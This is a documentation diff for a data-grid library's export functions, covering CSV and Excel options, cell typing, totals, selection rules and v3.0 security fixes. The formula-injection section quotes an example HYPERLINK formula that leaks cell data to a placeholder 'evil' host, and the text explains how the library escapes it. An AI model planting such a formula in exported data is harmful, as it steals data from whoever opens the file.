@@ -22,8 +22,8 @@ import { exportToCsv, exportToExcel, exportToExcelAdvanced, exportToJson, printG
 // CSV
 exportToCsv(rows, columns, { fileName: 'data.csv' });
 
-// Basic Excel (no deps)
-exportToExcel(rows, columns, { fileName: 'data.xlsx' });
+// Basic Excel (no deps) — an HTML table that Excel opens as a legacy .xls
+exportToExcel(rows, columns, { fileName: 'data.xls' });
 
 // Advanced Excel (ExcelJS, lazy-loaded)
 await exportToExcelAdvanced(rows, columns, { fileName: 'data.xlsx' });
@@ -58,16 +58,23 @@ exportToCsv(rows, columns, {
 |---|---|---|---|
 | `fileName` | `string` | `'export.csv'` | Output filename |
 | `includeHeaders` | `boolean` | `true` | Include column header row |
-| `delimiter` | `string` | `','` | Field delimiter |
-| `selectedRows` | `(string\|number)[]` | — | Export only these row IDs |
+| `delimiter` | `string` | `','` | Field delimiter. Values that contain it (or a quote, LF or CR) are quoted |
+| `selectedRows` | `(string\|number)[]` | — | Export only these row IDs. See [Selection, grouping and totals](#selection-grouping-and-totals) |
 | `aggregationResult` | `object \| null` | — | Appends two rows after the data: a function-label row (`SUM`, `AVG`…) then a values row |
 | `aggregationModel` | `object \| null` | — | Labels for aggregation row |
+| `groupedRows` | `GridGroupedExportRow[]` | — | Grouped structure from `apiRef.current.getGroupedExportRows()` |
+| `escapeFormulas` | `boolean` | `true` | Prefix text that starts with `=`, `+`, `-`, `@`, tab or CR with `'` (v3.0+). See [Formula injection](#formula-injection) |
+| `bom` | `boolean` | `true` | Start the file with a UTF-8 byte-order mark so Excel reads non-ASCII text (v3.0+) |
+
+### Formula injection
+
+Spreadsheet apps run any cell that starts with `=`, `+`, `-` or `@` as a formula, so user-entered text such as `=HYPERLINK("http://evil/?"&A2,"Click")` can leak data or run commands when someone opens the export ("CSV injection"). Since v3.0, `exportToCsv` and `exportToExcel` prefix such text — in cells, headers and group labels — with `'`, which makes it plain text. Plain signed numbers (`-12.50`) and text formatted from a number, date or boolean value are left alone. Pass `escapeFormulas: false` only when every exported value is trusted and you need live formulas.
 
 ---
 
 ## 2. `exportToExcel` (basic)
 
-HTML-table approach, no external libraries. Opens reliably in Excel and Numbers but as a legacy `.xls` format.
+HTML-table approach, no external libraries. Opens reliably in Excel and Numbers but as a legacy `.xls` format. Excel refuses HTML content named `.xlsx`, so since v3.0 a `.xlsx` file name is renamed to `.xls` (with a console warning); use [`exportToExcelAdvanced`](#3-exporttoexceladvanced--recommended) for a real `.xlsx`. Text cells are marked as text (`mso-number-format:"\@"`), so Excel keeps leading zeros (`00501`), long ids and strings like `1-2` as they are; number, date and boolean columns are left for Excel to type.
 
 ```tsx
 import { exportToExcel } from '@opencorestack/opengridx';
@@ -85,12 +92,14 @@ exportToExcel(rows, columns, {
 
 | Option | Type | Default | Description |
 |---|---|---|---|
-| `fileName` | `string` | `'export.xlsx'` | Output filename |
-| `sheetName` | `string` | `'Sheet1'` | Sheet tab name |
+| `fileName` | `string` | `'export.xls'` | Output filename (`.xlsx` is renamed to `.xls`) |
+| `sheetName` | `string` | `'Sheet1'` | Sheet tab name. Characters Excel rejects (`\ / ? * : [ ]`) become `-`; cut to 31 characters |
 | `includeHeaders` | `boolean` | `true` | Include column header row |
-| `selectedRows` | `(string\|number)[]` | — | Export only these row IDs |
+| `selectedRows` | `(string\|number)[]` | — | Export only these row IDs. See [Selection, grouping and totals](#selection-grouping-and-totals) |
 | `aggregationResult` | `object \| null` | — | Appends two rows after the data: a function-label row (`SUM`, `AVG`…) then a values row |
 | `aggregationModel` | `object \| null` | — | Labels for aggregation row |
+| `groupedRows` | `GridGroupedExportRow[]` | — | Grouped structure from `apiRef.current.getGroupedExportRows()` |
+| `escapeFormulas` | `boolean` | `true` | Prefix formula-like text with `'` (v3.0+). See [Formula injection](#formula-injection) |
 
 ---
 
@@ -162,7 +171,7 @@ await exportToExcelAdvanced(rows, columns, {
 | `bodyFontSize` | `number` | `10` | Body font size (pt) |
 | `aggregationResult` | `object \| null` | — | Aggregation totals |
 | `aggregationModel` | `object \| null` | — | Aggregation function labels |
-| `selectedRows` | `(string\|number)[]` | — | IDs for `rows: 'selected'` sheets |
+| `selectedRows` | `(string\|number)[]` | — | IDs for `rows: 'selected'` sheets. With no selection, such a sheet has only its header row (v3.0+) |
 | `groupedRows` | `GridGroupedExportRow[]` | — | Grouped structure from `apiRef.current.getGroupedExportRows()` (v2.1+). See [Grouped export](#grouped-export-to-advanced-excel) |
 | `groupHeaderFillColor` | `string` | `'#e8eaf6'` | Group-header row fill (grouped export) |
 | `groupSubtotalFillColor` | `string` | `'#f0f4ff'` | Group-subtotal row fill (grouped export) |
@@ -171,10 +180,10 @@ await exportToExcelAdvanced(rows, columns, {
 
 | Option | Type | Default | Description |
 |---|---|---|---|
-| `name` | `string` | — | Sheet tab name (max 31 chars) |
-| `rows` | `'all' \| 'selected'` | `'all'` | Which rows to include |
+| `name` | `string` | — | Sheet tab name. Characters Excel rejects (`\ / ? * : [ ]`) become `-`, the name is cut to 31 characters, and a duplicate name (case-insensitive, also between two `summary` sheets) gets a ` (2)` suffix (v3.0+) |
+| `rows` | `'all' \| 'selected'` | `'all'` | Which rows to include. `'selected'` writes only `selectedRows`, none when nothing is selected |
 | `includeHeaders` | `boolean` | `true` | Include column header row |
-| `includeSummary` | `boolean` | `false` | Aggregation totals rows at bottom |
+| `includeSummary` | `boolean` | `false` | Aggregation totals rows at bottom. On a `'selected'` sheet the totals are recomputed over the selected rows |
 | `autoFilter` | `boolean` | `true` | Excel filter dropdowns on header |
 | `frozenHeader` | `boolean` | `true` | Freeze row 1 |
 | `alternateRowColor` | `string \| false` | `'#f8fafc'` | Odd-row fill. `false` to disable |
@@ -183,10 +192,10 @@ await exportToExcelAdvanced(rows, columns, {
 
 | Option | Type | Description |
 |---|---|---|
-| `numFmt` | `string` | Excel number format, e.g. `'$#,##0.00'`, `'0.00%'`, `'yyyy-mm-dd'` |
+| `numFmt` | `string` | Excel number format, e.g. `'$#,##0.00'`, `'0.00%'`, `'yyyy-mm-dd'`. Defaults: `type: 'number'` cells get `'#,##0'` for whole numbers and `'#,##0.##'` otherwise; `type: 'date'` gets `'yyyy-mm-dd'` |
 | `width` | `number` | Column width in characters (overrides auto) |
 | `alignment` | `'left' \| 'center' \| 'right'` | Horizontal alignment |
-| `embedImage` | `boolean` | If true, URL in cell is fetched and embedded as image |
+| `embedImage` | `boolean` | If true, the cell's URL (after `valueGetter`) is fetched and embedded as an image. PNG, JPEG and GIF are embedded (detected from the bytes); other formats (SVG, WebP, AVIF) and failed fetches write the URL text instead |
 | `imageWidth` | `number` | Width of embedded image (px, default: 40) |
 | `imageHeight`| `number` | Height of embedded image (px, default: 40) |
 
@@ -204,7 +213,7 @@ await exportToExcelAdvanced(rows, columns, {
 });
 ```
 
-Sheets with `rows: 'all'` are written in grouped order: a bold group-header row (the same label the grid shows — see [Group labels in exports](#group-labels-in-exports)), the leaf rows, a `Subtotal` row per group, and a final `Grand Total`. Rows use Excel's native outlining, so users can collapse groups in Excel. Subtotal and total values are written as numbers so `columnStyles[field].numFmt` applies. A `grand-total` entry replaces the sheet's `includeSummary` rows, so totals are not duplicated. `rows: 'selected'` sheets ignore `groupedRows` and export flat.
+Sheets with `rows: 'all'` are written in grouped order: a bold group-header row (the same label the grid shows — see [Group labels in exports](#group-labels-in-exports)), the leaf rows, a `Subtotal` row per group, and a final `Grand Total`. Rows use Excel's native outlining, so users can collapse groups in Excel. Subtotal and total values are written as numbers so `columnStyles[field].numFmt` applies — except `count` and `unique`, which are plain integers (`'#,##0'`) rather than, say, a currency or date, and `min` / `max` of a date column, which are written as dates. When the first column has its own aggregate, its value is written instead of the `Subtotal` label. A `grand-total` entry replaces the sheet's `includeSummary` rows, so totals are not duplicated. `rows: 'selected'` sheets ignore `groupedRows` and export flat.
 
 ### Group labels in exports
 
@@ -218,7 +227,7 @@ Before v3.0, only advanced Excel applied `groupingValueFormatter` (falling back 
 
 ### Summary Sheet
 
-Pass `{ type: 'summary', name: 'My Sheet' }` in `sheets` to add a standalone aggregation sheet:
+Pass `{ type: 'summary', name: 'My Sheet' }` in `sheets` to add a standalone aggregation sheet. Values are numeric cells (v3.0+; they were locale-formatted text before) in the column's `numFmt`, so with `columnStyles: { salary: { numFmt: '$#,##0' } }`:
 
 ```
 | Column       | Function | Value     |
@@ -227,6 +236,22 @@ Pass `{ type: 'summary', name: 'My Sheet' }` in `sheets` to add a standalone agg
 | Bonus        | SUM      | $1,040,000|
 | Perf. Score  | AVG      | 3.7       |
 ```
+
+The flat `includeSummary` totals row is numeric in the same way.
+
+### Cell types
+
+`exportToExcelAdvanced` writes native cells so Excel can sort, filter and sum them:
+
+| Column / value | Written as |
+|---|---|
+| `type: 'number'` — numbers, and numeric strings such as `'42.50'` | Number |
+| `type: 'boolean'` — booleans, and `'true'` / `'false'` strings | Boolean |
+| `type: 'date'` — `Date`, epoch milliseconds, and ISO strings (`'2024-01-15'`, `'2024-01-15T10:30'`) | Date, with the same calendar day and wall-clock time the grid shows in the user's timezone |
+| A value that is not of the column's type (`'n/a'` in a number column) | The `valueFormatter` text, else the value as text |
+| `NaN`, `Infinity`, Invalid Date, `null` | Empty cell (or the `valueFormatter` text, which also runs for missing values) |
+| Objects and arrays | JSON text. Objects are never handed to ExcelJS as-is, so `{ formula }`, `{ hyperlink }`, `{ richText }` or `{ error }` row data cannot become live formulas or links |
+| Anything else | The `valueFormatter` text, else the value |
 
 ### Feature Comparison: Basic vs Advanced
 
@@ -263,6 +288,8 @@ exportToJson(rows, columns, {
 });
 ```
 
+JSON is a data format, so values are written raw: `valueGetter` is applied, `valueFormatter` is not.
+
 When `aggregationResult` is provided, output shape becomes:
 ```json
 {
@@ -273,6 +300,8 @@ When `aggregationResult` is provided, output shape becomes:
   }
 }
 ```
+
+`aggregation.values` are the raw results (numbers). Before v3.0 they were locale-formatted strings such as `"8,320,000"`. With `groupedRows`, the output is `{ groups, grandTotal }`, and `subtotals` / `grandTotal` contain only exported columns (an `exportable: false` column's totals are left out, v3.0+).
 
 **`JsonExportOptions`:**
 
@@ -310,15 +339,20 @@ printGrid(rows, columns, {
 | Option | Type | Description |
 |---|---|---|
 | `title` | `string` | Print page title |
-| `selectedRows` | `(string\|number)[]` | Print only these row IDs |
+| `selectedRows` | `(string\|number)[]` | Print only these row IDs. See [Selection, grouping and totals](#selection-grouping-and-totals) |
 | `aggregationResult` | `object \| null` | Append totals |
 | `aggregationModel` | `object \| null` | Label totals |
+| `groupedRows` | `GridGroupedExportRow[]` | Grouped structure from `apiRef.current.getGroupedExportRows()` |
+
+The print window is a same-origin popup, so every value written into it — title, cells, headers, group labels, image URLs and alt text, error messages — is HTML-escaped. `type: 'image'` columns render an `<img>` only for `http(s):`, `data:image/…`, `blob:` and relative URLs; any other value (e.g. `javascript:…`) is printed as text.
 
 ---
 
 ## Common Patterns
 
 ### Export with toolbar integration
+
+`GridToolbar` has no built-in export action; render your own button with `renderExportButton`:
 
 ```tsx
 import { DataGrid, GridToolbar, exportToExcelAdvanced } from '@opencorestack/opengridx';
@@ -335,14 +369,22 @@ function MyGrid() {
       checkboxSelection
       rowSelectionModel={selected}
       onRowSelectionModelChange={setSelected}
-      slots={{ toolbar: GridToolbar }}
-      slotProps={{
-        toolbar: {
-          onExcelAdvanced: () => exportToExcelAdvanced(rows, columns, {
-            fileName: 'report.xlsx',
-            selectedRows: selected,
-          }),
-        },
+      slots={{
+        toolbar: () => (
+          <GridToolbar
+            renderExportButton={() => (
+              <button
+                onClick={() => exportToExcelAdvanced(rows, columns, {
+                  fileName: 'report.xlsx',
+                  sheets: [{ name: 'Selected', rows: 'selected' }],
+                  selectedRows: selected,
+                })}
+              >
+                Export to Excel
+              </button>
+            )}
+          />
+        ),
       }}
     />
   );
@@ -389,7 +431,7 @@ await exportToExcelAdvanced(rows, columns, {
 
 ## Value Formatters
 
-All export functions respect `valueFormatter` and `valueGetter`:
+Every exporter applies `valueGetter`. CSV, basic Excel, print and PDF write the `valueFormatter` text, as the grid does — since v3.0 the formatter also runs for `null` / `undefined` values, so placeholder text such as `'Unassigned'` or `'—'` is exported (a formatter that throws for a missing value exports an empty cell). JSON writes raw values, and advanced Excel writes typed columns natively (see the note below):
 
 ```tsx
 const columns: GridColDef[] = [
@@ -404,7 +446,15 @@ const columns: GridColDef[] = [
 ];
 ```
 
-> **Note:** In `exportToExcelAdvanced`, `valueFormatter` is only applied for `string`-typed columns. For `number`/`date`/`boolean` columns, raw values are passed to Excel and formatted via `columnStyles.numFmt`.
+> **Note:** In `exportToExcelAdvanced`, `valueFormatter` is only applied for `string`-typed columns. For `number`/`date`/`boolean` columns, raw values are passed to Excel and formatted via `columnStyles.numFmt`; the formatter is used only for values that are missing or not of the column's type (see [Cell types](#cell-types)).
+
+### Aggregate values
+
+Subtotal, grand-total and totals cells are formatted the same way in every text format (CSV, basic Excel, print, PDF):
+
+- `count` and `unique` are plain counts formatted like the grid footer (`1,234`); the column's `valueFormatter` is not applied, because a count of a currency column is not an amount.
+- `sum`, `avg`, `min` and `max` go through the column's `valueFormatter`. Its `row` argument is the record of aggregated values (like the grid's group rows), not a data row; if the formatter throws, the value is formatted like the grid footer instead of aborting the export. `min` / `max` of a `type: 'date'` column reach the formatter as a `Date`.
+- When the first exported column has its own aggregate, its value is kept next to the label (`Subtotal: 300`, `TOTAL: $30.00`) instead of being overwritten.
 
 ---
 
@@ -417,7 +467,7 @@ You can exclude specific columns (e.g., action buttons or menus) from all export
 | `exportable: false` | Set in `GridColDef` to manually exclude any column |
 | `__check__` | Native checkbox column (auto-excluded) |
 | `__actions__` | Common field for action buttons (auto-excluded) |
-| `isSpacer: true` | Spacer columns (auto-excluded) |
+| `isSpacer: true` | Spacer columns (auto-excluded from every format since v3.0; before, only advanced Excel skipped them) |
 
 ### Example
 ```tsx
@@ -427,10 +477,21 @@ const columns: GridColDef[] = [
   { 
     field: 'actions', 
     headerName: 'Actions', 
-    exportable: false // This column won't appear in CSV/Excel/JSON/Print
+    exportable: false // This column won't appear in CSV/Excel/JSON/PDF/Print
   },
 ];
 ```
+
+---
+
+## Selection, grouping and totals
+
+Every exporter follows the same rules (v3.0+):
+
+- **`selectedRows`** exports only the rows with those IDs, picked from the `rows` you pass. Pass all rows plus `selectedRows` rather than pre-filtering, so the exporter knows a selection was applied.
+- **A non-empty selection takes precedence over `groupedRows`**: the selected rows are exported flat. (Before v3.0, CSV, basic Excel, JSON, print and PDF silently ignored the selection and exported every grouped row.) In `exportToExcelAdvanced`, `rows: 'selected'` sheets are flat and `rows: 'all'` sheets use `groupedRows`.
+- **Totals follow the exported rows.** The grid's `aggregationResult` covers all filtered rows; when a selection narrows the export, the totals row is recomputed over the selected rows with the grid's own aggregation functions (it needs `aggregationModel`). Without a selection, `aggregationResult` is written as given — if you pass a subset of rows yourself (e.g. the current page), pass totals computed for that subset.
+- Row selection is linear in the number of rows, so exporting "select all" on a large grid does not freeze the tab.
 
 ---
 
